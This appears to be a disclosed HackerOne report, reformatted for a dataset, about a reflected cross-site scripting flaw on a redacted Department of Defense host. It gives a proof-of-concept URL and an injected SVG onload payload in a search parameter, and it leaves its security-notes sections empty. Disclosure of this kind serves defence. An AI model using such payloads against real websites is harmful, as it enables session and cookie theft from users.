---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1370746'
original_report_id: '1370746'
title: Cross-site Scripting (XSS) - Reflected at https://██████████/
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2021-10-15T06:15:02.703Z'
disclosed_at: '2022-04-07T20:00:53.446Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Cross-site Scripting (XSS) - Reflected at https://██████████/

## Metadata

- HackerOne Report ID: 1370746
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2022-04-07T20:00:53.446Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello Team,
i just found a reflected xss bug on your web https://█████

Step To reproduce:
 poc url: https://████/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E

## Impact

Impact
Data can be stolen, or Javascript can be executed.This is will allow the attacker to steal users cookies

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. go to parameter  https://█████████/7/0/33/1d/www.citysearch.com/search?what=x&where=
2. enter "><svg+onload=confirm(document.domain)>

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
